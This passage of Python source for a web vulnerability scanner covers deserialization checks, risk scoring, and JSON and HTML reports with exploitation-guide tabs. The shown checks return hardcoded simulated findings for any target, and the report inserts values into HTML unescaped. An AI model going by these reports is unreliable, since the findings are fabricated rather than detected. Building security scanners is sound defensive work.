            vuln_info = self.vuln_database["ssrf"]
            for endpoint in vulnerable_endpoints:
                vulnerability = {
                    "type": "ssrf",
                    "name": vuln_info["name"],
                    "description": vuln_info["description"],
                    "severity": vuln_info["severity"],
                    "cwe": vuln_info["cwe"],
                    "owasp_category": vuln_info["owasp_category"],
                    "affected_endpoints": endpoint,
                    "remediation": vuln_info["remediation"]
                }
                self.results["vulnerabilities"].append(vulnerability)
                
        return vulnerable_endpoints
    
    def scan_for_insecure_deserialization(self, target):
        """Scan for insecure deserialization vulnerabilities"""
        logger.info(f"Scanning for insecure deserialization vulnerabilities on {target}")
        
        # Simulate scanning results
        vulnerable_endpoints = [
            {
                "url": f"{target}/api/load-state",
                "parameter": "data",
                "method": "POST",
                "evidence": "Server deserializes user-provided data with PHP unserialize()",
                "confidence": "Medium"
            }
        ]
        
        # If vulnerabilities found, add to results
        if vulnerable_endpoints:
            vuln_info = self.vuln_database["insecure_deserialization"]
            for endpoint in vulnerable_endpoints:
                vulnerability = {
                    "type": "insecure_deserialization",
                    "name": vuln_info["name"],
                    "description": vuln_info["description"],
                    "severity": vuln_info["severity"],
                    "cwe": vuln_info["cwe"],
                    "owasp_category": vuln_info["owasp_category"],
                    "affected_endpoints": endpoint,
                    "remediation": vuln_info["remediation"]
                }
                self.results["vulnerabilities"].append(vulnerability)
                
        return vulnerable_endpoints
    
    def generate_summary(self):
        """Generate a summary of the scan results"""
        
        # Count vulnerabilities by severity
        severity_counts = {
            "Critical": 0,
            "High": 0,
            "Medium": 0,
            "Low": 0,
            "Info": 0
        }
        
        for vuln in self.results["vulnerabilities"]:
            severity_counts[vuln["severity"]] += 1
            
        # Calculate risk score (simple algorithm - can be improved)
        risk_score = (
            severity_counts["Critical"] * 10 +
            severity_counts["High"] * 5 +
            severity_counts["Medium"] * 2 +
            severity_counts["Low"] * 1
        )
        
        # Determine risk level
        risk_level = "Low"
        if risk_score > 20:
            risk_level = "Critical"
        elif risk_score > 10:
            risk_level = "High"
        elif risk_score > 5:
            risk_level = "Medium"
            
        # Generate top recommendations
        recommendations = []
        for vuln in self.results["vulnerabilities"]:
            if vuln["severity"] in ["Critical", "High"]:
                recommendations.append({
                    "vulnerability": vuln["name"],
                    "recommendation": vuln["remediation"]["description"]
                })
                
        # Ensure we have at most 3 recommendations
        recommendations = recommendations[:3]
        
        # Add vulnerable components summary
        vulnerable_components_summary = {
            "count": len(self.results["vulnerable_components"]),
            "critical_components": [comp["component_name"] for comp in self.results["vulnerable_components"] 
                                  if comp["severity"] == "Critical"],
            "high_risk_components": [comp["component_name"] for comp in self.results["vulnerable_components"] 
                                  if comp["severity"] == "High"]
        }
        
        # Create summary
        self.results["summary"] = {
            "scan_date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "target": self.results["target"],
            "total_vulnerabilities": len(self.results["vulnerabilities"]),
            "severity_counts": severity_counts,
            "risk_score": risk_score,
            "risk_level": risk_level,
            "top_recommendations": recommendations,
            "vulnerable_components": vulnerable_components_summary
        }
        
        return self.results["summary"]
    
    def save_results(self, filename=None):
        """Save scan results to file"""
        if not filename:
            filename = os.path.join(self.report_dir, "vulnerability_scan_report.json")
            
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=4)
            
        logger.info(f"Scan results saved to {filename}")
        return filename
    
    def generate_html_report(self, filename=None):
        """Generate an HTML report from the scan results"""
        if not filename:
            filename = os.path.join(self.report_dir, "vulnerability_scan_report.html")
            
        # Simple HTML report template
        html_template = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Vulnerability Scan Report</title>
            <style>
                body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 20px; }
                h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
                h2 { color: #2980b9; margin-top: 30px; }
                h3 { color: #3498db; }
                .container { max-width: 1200px; margin: 0 auto; }
                .summary { background-color: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 30px; }
                .high { background-color: #f8d7da; padding: 15px; border-left: 5px solid #dc3545; margin-bottom: 15px; }
                .medium { background-color: #fff3cd; padding: 15px; border-left: 5px solid #ffc107; margin-bottom: 15px; }
                .low { background-color: #d1ecf1; padding: 15px; border-left: 5px solid #17a2b8; margin-bottom: 15px; }
                .code { background-color: #f8f9fa; padding: 10px; border: 1px solid #ddd; border-radius: 5px; font-family: monospace; overflow-x: auto; }
                table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                th { background-color: #f2f2f2; }
                tr:nth-child(even) { background-color: #f9f9f9; }
                .footer { margin-top: 50px; font-size: 0.8em; text-align: center; color: #7f8c8d; }
                .vulnerable-component { background-color: #f9f9f9; padding: 15px; border-radius: 5px; margin-bottom: 20px; border-left: 5px solid #e74c3c; }
                .exploit { background-color: #f2dede; padding: 10px; border-radius: 5px; margin: 10px 0; }
                .exploit-section { background-color: #fff0f0; padding: 15px; border-radius: 5px; margin: 15px 0; border-left: 5px solid #ff6b6b; }
                .impact-item { margin: 5px 0; }
                .tool-item { display: inline-block; background-color: #e3f2fd; padding: 3px 8px; border-radius: 3px; margin: 2px; }
                .command-example { background-color: #2d2d2d; color: #f8f8f2; padding: 10px; border-radius: 4px; margin: 10px 0; font-family: 'Courier New', monospace; }
                .tab {
                    overflow: hidden;
                    border: 1px solid #ccc;
                    background-color: #f1f1f1;
                    border-radius: 4px 4px 0 0;
                }
                .tab button {
                    background-color: inherit;
                    float: left;
                    border: none;
                    outline: none;
                    cursor: pointer;
                    padding: 10px 16px;
                    transition: 0.3s;
                    font-size: 14px;
                }
                .tab button:hover {
                    background-color: #ddd;
                }
                .tab button.active {
                    background-color: #3498db;
                    color: white;
                }
                .tabcontent {
                    display: none;
                    padding: 15px;
                    border: 1px solid #ccc;
                    border-top: none;
                    border-radius: 0 0 4px 4px;
                }
                .tabcontent.active {
                    display: block;
                }
            </style>
            <script>
                function openTab(evt, tabName, componentId) {
                    var i, tabcontent, tablinks;
                    tabcontent = document.querySelectorAll("#" + componentId + " .tabcontent");
                    for (i = 0; i < tabcontent.length; i++) {
                        tabcontent[i].style.display = "none";
                        tabcontent[i].className = tabcontent[i].className.replace(" active", "");
                    }
                    tablinks = document.querySelectorAll("#" + componentId + " .tablinks");
                    for (i = 0; i < tablinks.length; i++) {
                        tablinks[i].className = tablinks[i].className.replace(" active", "");
                    }
                    document.getElementById(tabName).style.display = "block";
                    document.getElementById(tabName).className += " active";
                    evt.currentTarget.className += " active";
                }
                
                window.onload = function() {
                    // Set the first tab as active for each component
                    const components = document.querySelectorAll('.vulnerable-component');
                    components.forEach(component => {
                        const firstTabBtn = component.querySelector('.tablinks');
                        const firstTabContent = component.querySelector('.tabcontent');
                        if (firstTabBtn && firstTabContent) {
                            firstTabBtn.className += " active";
                            firstTabContent.style.display = "block";
                            firstTabContent.className += " active";
                        }
                    });
                }
            </script>
        </head>
        <body>
            <div class="container">
                <h1>Vulnerability Scan Report</h1>
                
                <div class="summary">
                    <h2>Executive Summary</h2>
                    <p><strong>Target:</strong> {target}</p>
                    <p><strong>Scan Date:</strong> {scan_date}</p>
                    <p><strong>Risk Level:</strong> {risk_level}</p>
                    <p><strong>Total Vulnerabilities:</strong> {total_vulnerabilities}</p>
                    <ul>
                        <li>Critical: {critical_count}</li>
                        <li>High: {high_count}</li>
                        <li>Medium: {medium_count}</li>
                        <li>Low: {low_count}</li>
                    </ul>
                    
                    <h3>Top Recommendations</h3>
                    <ol>
                        {top_recommendations}
                    </ol>
                </div>
                
                <h2>Vulnerable Components</h2>
                {vulnerable_components_details}
                
                <h2>Detailed Findings</h2>
                
                {vulnerability_details}
                
                <div class="footer">
                    <p>Report generated on {generation_date} by Vulnerability Scanner</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        # Format vulnerability details
        vulnerability_details_html = ""
        for i, vuln in enumerate(self.results["vulnerabilities"]):
            severity_class = "high" if vuln["severity"] in ["Critical", "High"] else "medium" if vuln["severity"] == "Medium" else "low"
            
            # Format code examples
            code_examples_html = ""
            if "code_examples" in vuln["remediation"]:
                for lang, code in vuln["remediation"]["code_examples"].items():
                    code_examples_html += f"""
                    <h5>{lang.upper()}</h5>
                    <div class="code">{code}</div>
                    """
            
            vulnerability_details_html += f"""
            <div class="{severity_class}">
                <h3>{i+1}. {vuln["name"]}</h3>
                <p><strong>Severity:</strong> {vuln["severity"]}</p>
                <p><strong>Description:</strong> {vuln["description"]}</p>
                <p><strong>CWE:</strong> <a href="https://cwe.mitre.org/data/definitions/{vuln["cwe"].split('-')[1]}.html" target="_blank">{vuln["cwe"]}</a></p>
                <p><strong>OWASP Category:</strong> {vuln["owasp_category"]}</p>
                
                <h4>Affected Endpoint</h4>
                <table>
                    <tr>
                        <th>URL</th>
                        <td>{vuln["affected_endpoints"]["url"]}</td>
                    </tr>
                    <tr>
                        <th>Method</th>
                        <td>{vuln["affected_endpoints"]["method"]}</td>
                    </tr>
                    <tr>
                        <th>Parameter</th>
                        <td>{vuln["affected_endpoints"].get("parameter", "N/A")}</td>
                    </tr>
                    <tr>
                        <th>Evidence</th>
                        <td>{vuln["affected_endpoints"]["evidence"]}</td>
                    </tr>
                </table>
                
                <h4>Remediation</h4>
                <p>{vuln["remediation"]["description"]}</p>
                
                <h5>Implementation Steps</h5>
                <ol>
                    {"".join([f"<li>{step}</li>" for step in vuln["remediation"]["steps"]])}
                </ol>
                
                <h5>Code Examples</h5>
                {code_examples_html}
            </div>
            """
            
        # Format vulnerable components details with enhanced exploitation section
        vulnerable_components_html = ""
        for i, comp in enumerate(self.results["vulnerable_components"]):
            component_id = f"component-{i}"
            affected_components_html = "".join([f"<li>{component}</li>" for component in comp["affected_components"]])
            remediation_steps_html = "".join([f"<li>{step}</li>" for step in comp["remediation_steps"]])
            
            # Format detailed exploitation information
            detailed_exploitation = comp.get("detailed_exploitation", {})
            exploit_steps_html = "".join([f"<li>{step}</li>" for step in detailed_exploitation.get("steps", [])])
            
            # Format command examples
            command_examples_html = ""
            for cmd in detailed_exploitation.get("command_examples", []):
                command_examples_html += f'<div class="command-example">{cmd}</div>'
            
            # Format code examples
            code_examples_html = ""
            for lang, code in detailed_exploitation.get("code_examples", {}).items():
                code_examples_html += f"""
                <h5>{lang.upper()}</h5>
                <div class="code">{code}</div>
                """
            
            # Format required tools
            tools_html = "".join([f'<span class="tool-item">{tool}</span>' for tool in detailed_exploitation.get("required_tools", [])])
            
            # Format potential impact
            impact_html = "".join([f'<div class="impact-item"> {impact}</div>' for impact in detailed_exploitation.get("potential_impact", [])])
            
            vulnerable_components_html += f"""
            <div class="vulnerable-component" id="{component_id}">
                <h3>{i+1}. {comp["vulnerability_type"]}</h3>
                <p><strong>Affected Component:</strong> {comp["component_name"]}</p>
                <p><strong>Severity:</strong> {comp["severity"]}</p>
                
                <div class="tab">
                    <button class="tablinks" onclick="openTab(event, '{component_id}-overview', '{component_id}')">Overview</button>
                    <button class="tablinks" onclick="openTab(event, '{component_id}-exploitation', '{component_id}')">Exploitation</button>
                    <button class="tablinks" onclick="openTab(event, '{component_id}-impact', '{component_id}')">Impact</button>
                    <button class="tablinks" onclick="openTab(event, '{component_id}-remediation', '{component_id}')">Remediation</button>
                </div>
                
                <div id="{component_id}-overview" class="tabcontent">
                    <h4>Description</h4>
                    <p>{comp["exploit_description"]}</p>
                    
                    <h4>Commonly Affected Components</h4>
                    <ul>
                        {affected_components_html}
                    </ul>
                </div>
                
                <div id="{component_id}-exploitation" class="tabcontent">
                    <h4>Step-by-Step Exploitation Guide</h4>
                    <div class="exploit-section">
                        <ol>
                            {exploit_steps_html}
                        </ol>
                        
                        <h5>Example Exploit Payload</h5>
                        <div class="code">{comp["exploit_example"]}</div>
                        
                        {code_examples_html if code_examples_html else ""}
                        
                        <h5>Command Examples</h5>
                        {command_examples_html if command_examples_html else "<p>No specific command examples available.</p>"}
                        
                        <h5>Required Tools</h5>
                        <p>{tools_html if tools_html else "No specific tools required."}</p>
                    </div>
                </div>
                
                <div id="{component_id}-impact" class="tabcontent">
                    <h4>Potential Impact</h4>
                    <div class="exploit-section">
                        {impact_html if impact_html else "<p>Impact information not available.</p>"}
                    </div>
                </div>
                
                <div id="{component_id}-remediation" class="tabcontent">
                    <h4>Remediation</h4>
                    <p>{comp["remediation"]}</p>
                    
                    <h5>Remediation Steps</h5>
                    <ol>
                        {remediation_steps_html}
                    </ol>
                </div>
            </div>
            """
        
        # Format top recommendations
        top_recommendations_html = ""
        for rec in self.results["summary"]["top_recommendations"]:
            top_recommendations_html += f"<li>{rec['vulnerability']}: {rec['recommendation']}</li>"
            
        # Fill in the template
        html_content = html_template.format(
            target=self.results["summary"]["target"],
            scan_date=self.results["summary"]["scan_date"],
            risk_level=self.results["summary"]["risk_level"],
            total_vulnerabilities=self.results["summary"]["total_vulnerabilities"],
            critical_count=self.results["summary"]["severity_counts"]["Critical"],
            high_count=self.results["summary"]["severity_counts"]["High"],
            medium_count=self.results["summary"]["severity_counts"]["Medium"],
            low_count=self.results["summary"]["severity_counts"]["Low"],
            top_recommendations=top_recommendations_html or "<li>No high-priority recommendations</li>",
            vulnerable_components_details=vulnerable_components_html or "<p>No vulnerable components identified.</p>",
            vulnerability_details=vulnerability_details_html or "<p>No vulnerabilities found.</p>",
            generation_date=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        )
        
        # Write to file
        with open(filename, 'w') as f:
            f.write(html_content)
            
        logger.info(f"HTML report generated at {filename}")
        return filename
        
    def run_scan(self):
        """Run the vulnerability scan on the target URL"""
        if not self.target_url:
            raise ValueError("No target URL specified for scanning")
        
        logger.info(f"Starting vulnerability scan with ID {self.scan_id} for {self.target_url}")
        return self.scan_target(self.target_url)
    
    @property
    def vulnerabilities(self):
        """Get the vulnerabilities found in the scan"""
        return self.results.get("vulnerabilities", [])

    def enhance_exploit_documentation(self):
        """Enhance exploitation documentation using the ExploitDocumenter utility"""
        logger.info("Enhancing exploit documentation with ExploitDocumenter")
        
        try:
            # Check if ExploitDocumenter is available
            from exploit_documenter import ExploitDocumenter
            
            # Create ExploitDocumenter instance
            documenter = ExploitDocumenter(output_dir=self.report_dir)
            
            # Enrich scan results with detailed exploitation information
            enriched_results = documenter.enrich_scan_results(self.results)
            
            # Update our results with enriched information
            if "vulnerable_components" in enriched_results:
                # Merge existing vulnerable_components with enriched ones
                # If a component already exists, update it with enriched information
                existing_components = {comp.get("vulnerability_type", ""): comp for comp in self.results["vulnerable_components"]}
                enriched_components = {comp.get("vulnerability_type", ""): comp for comp in enriched_results["vulnerable_components"]}
                
                # Update existing components with enriched information
                for vuln_type, enriched_comp in enriched_components.items():
                    if vuln_type in existing_components:
                        # Update existing component
                        existing_comp = existing_components[vuln_type]
                        
                        # Merge detailed_exploitation info
                        if "detailed_exploitation" in enriched_comp:
                            if "detailed_exploitation" not in existing_comp:
                                existing_comp["detailed_exploitation"] = {}
                                
                            # Update detailed exploitation info
                            for key, value in enriched_comp["detailed_exploitation"].items():
                                if key not in existing_comp["detailed_exploitation"]:
                                    existing_comp["detailed_exploitation"][key] = value
                    else:
                        # Add new component
                        self.results["vulnerable_components"].append(enriched_comp)
            
            logger.info("Exploit documentation enhanced successfully")
            
        except ImportError:
            logger.warning("ExploitDocumenter not available, skipping documentation enhancement")
        except Exception as e:
            logger.error(f"Error enhancing exploit documentation: {str(e)}")
            
    def generate_exploitation_guide(self):
        """Generate a comprehensive exploitation guide for all identified vulnerabilities"""
        logger.info("Generating comprehensive exploitation guide")
        
        try:
            # Check if ExploitDocumenter is available
            from exploit_documenter import ExploitDocumenter
            
            # Create ExploitDocumenter instance
            documenter = ExploitDocumenter(output_dir=self.report_dir)
            
            # Generate exploitation guide
            guide_path = documenter.generate_exploitation_guide(
                self.results, 
                output_file=os.path.join(self.report_dir, "exploitation_guide.md")
            )
            
            logger.info(f"Exploitation guide generated at {guide_path}")
            
        except ImportError:
            logger.warning("ExploitDocumenter not available, skipping exploitation guide generation")
        except Exception as e:
            logger.error(f"Error generating exploitation guide: {str(e)}")

def main():
    """Command line interface for the vulnerability scanner"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Enhanced Vulnerability Scanner")
    parser.add_argument("target", help="Target URL to scan")
    parser.add_argument("--output", "-o", help="Output directory for scan results", default="vulnerability_scan")
    parser.add_argument("--format", "-f", choices=["json", "html", "both"], default="both", help="Report format")
    args = parser.parse_args()
    
    try:
        scanner = VulnerabilityScanner(args.target, args.output)
        scanner.scan_target(args.target)
        
        # Generate reports
        if args.format in ["json", "both"]:
            json_report = scanner.save_results()
            print(f"JSON report saved to: {json_report}")
            
        if args.format in ["html", "both"]:
            html_report = scanner.generate_html_report()
            print(f"HTML report saved to: {html_report}")
            
    except Exception as e:
        print(f"Error: {str(e)}")
        logger.error(f"Error in main execution: {str(e)}", exc_info=True)
        return 1
        
    return 0

if __name__ == "__main__":
    sys.exit(main()) 